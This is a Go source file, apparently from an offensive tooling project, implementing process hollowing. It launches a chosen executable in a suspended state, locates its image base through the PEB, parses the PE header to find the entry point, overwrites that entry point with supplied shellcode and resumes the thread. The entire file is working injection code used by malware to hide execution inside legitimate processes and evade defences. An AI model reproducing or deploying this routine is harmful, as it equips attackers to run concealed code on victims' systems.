package inject

import (
	"encoding/binary"
	"unsafe"
	"variant/log"

	"golang.org/x/sys/windows"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

func ProcessHollowing(sc []byte, path string) {
	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	err := windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfo,
		&outProcInfo,
	)

	if err != nil {
		log.Fatalf("Failed to Create Process: %v", err)
	}

	log.Infof("Process Created from path: %s with PID: %d", path, outProcInfo.ProcessId)
	log.Infof("Process Handle: %x", outProcInfo.Process)
	log.Infof("Thread Handle: %x", outProcInfo.Thread)

	var ProcessInformation PROCESS_BASIC_INFORMATION
	ProcessInformationLength := uint32(unsafe.Sizeof(uintptr(0)))
	var ReturnLength uint32

	err = windows.NtQueryInformationProcess(
		outProcInfo.Process,
		0,
		unsafe.Pointer(&ProcessInformation),
		ProcessInformationLength*6,
		&ReturnLength,
	)
	if err != nil {
		log.Fatalf("Failed to Query Information Process: %v", err)
	}

	imageBaseAddress := uint64(ProcessInformation.PebAddress + 0x10)
	log.Infof("Address Holding image base address: 0x%x", imageBaseAddress)

	lpBuffer := make([]byte, unsafe.Sizeof(uintptr(0)))
	var lpNumberOfBytesRead uintptr

	err = windows.ReadProcessMemory(
		outProcInfo.Process,
		uintptr(imageBaseAddress),
		&lpBuffer[0],
		uintptr(len(lpBuffer)),
		&lpNumberOfBytesRead,
	)
	if err != nil {
		log.Fatalf("Failed to ReadProcessMemory -- imageBaseAddress: %v", err)
	}
	log.Infof("Number of bytes read: %d\n", lpNumberOfBytesRead)

	lpBaseAddress := binary.LittleEndian.Uint64(lpBuffer)
	log.Infof("Image base: 0x%x\n", lpBaseAddress)

	lpBuffer = make([]byte, 0x200)

	err = windows.ReadProcessMemory(
		outProcInfo.Process,
		uintptr(lpBaseAddress),
		&lpBuffer[0],
		uintptr(len(lpBuffer)),
		&lpNumberOfBytesRead,
	)
	if err != nil {
		log.Fatalf("Failed to ReadProcessMemory -- lpBaseAddress: %v", err)
	}
	lfaNewPos := lpBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)

	log.Infof("PE Signature Offset: 0x%x", lfanew)

	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := lpBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	log.Infof("Entry Point Offset: 0x%x", entrypointRVA)
	entrypointAddress := lpBaseAddress + uint64(entrypointRVA)
	log.Infof("Entry Point Address Identified 0x%x", entrypointAddress)

	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(
		outProcInfo.Process,
		uintptr(entrypointAddress),
		&sc[0],
		uintptr(len(sc)),
		&numberOfBytesWritten,
	)
	if err != nil {
		log.Fatalf("Failed to WriteProcessMemory: %v", err)
	}

	log.Infof("Wrote %d/%d shellcode bytes to destination address", numberOfBytesWritten, len(sc))

	_, err = windows.ResumeThread(outProcInfo.Thread)
	if err != nil {
		log.Fatalf("Can't resume thread. %v", err)
	}
	log.Infof("Resuming Suspended Thread")
}
